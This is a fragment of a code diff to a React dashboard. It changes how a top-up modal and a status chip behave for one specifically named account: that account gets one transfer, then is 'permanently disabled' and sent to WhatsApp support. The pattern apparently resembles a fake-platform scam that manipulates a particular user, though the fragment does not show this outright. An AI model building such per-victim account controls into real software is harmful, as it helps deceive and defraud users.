                                 <Button fullWidth variant="contained" onClick={() => window.open(whatsappLink, '_blank')} sx={{ bgcolor: '#25D366' }} startIcon={<WhatsAppIcon />}>Contact Support</Button>
@@ -1085,7 +1255,7 @@ function Dashboard() {
                     <Box sx={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', bgcolor: 'white', borderRadius: '24px', p: 4, width: { xs: '90%', sm: 400 } }}>
                         <IconButton sx={{ position: 'absolute', right: 8, top: 8 }} onClick={() => setTopUpModal(false)}><Close /></IconButton>
                         <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: '#0A1E3F' }}>Top Up Account</Typography>
-                        {isLaineyAccount ? (
+                        {isLaineyAccount && isAccountDisabled ? (
                             <Box sx={{ textAlign: 'center' }}>
                                 <Alert severity="warning" sx={{ mb: 3 }}>Account is disabled. Contact support.</Alert>
                                 <Button fullWidth variant="contained" onClick={() => window.open(whatsappLink, '_blank')} sx={{ bgcolor: '#25D366' }} startIcon={<WhatsAppIcon />}>Contact Support</Button>
@@ -1110,7 +1280,13 @@ function Dashboard() {
                         <Typography variant="body2"><strong>Balance:</strong> {formatCurrency(displayBalance)}</Typography>
                         <Typography variant="body2"><strong>Country:</strong> {displayCountry}</Typography>
                         {isLaineyAccount && (
-                            <Chip label="Account Disabled" size="small" sx={{ mt: 2, bgcolor: '#dc004e', color: 'white' }} />
+                            isAccountDisabled ? (
+                                <Chip label="Account Permanently Disabled" size="small" sx={{ mt: 2, bgcolor: '#dc004e', color: 'white' }} />
+                            ) : transferCount >= 1 ? (
+                                <Chip label="⚠️ Next transfer disables account" size="small" sx={{ mt: 2, bgcolor: '#FF9800', color: 'white' }} />
+                            ) : (
+                                <Chip label="First transfer enabled" size="small" sx={{ mt: 2, bgcolor: '#4CAF50', color: 'white' }} />
+                            )
                         )}
                         <GoldButton fullWidth sx={{ mt: 2 }} onClick={() => { setProfileModal(false); setTabValue(3); }}>Full Profile</GoldButton>
                     </Box>
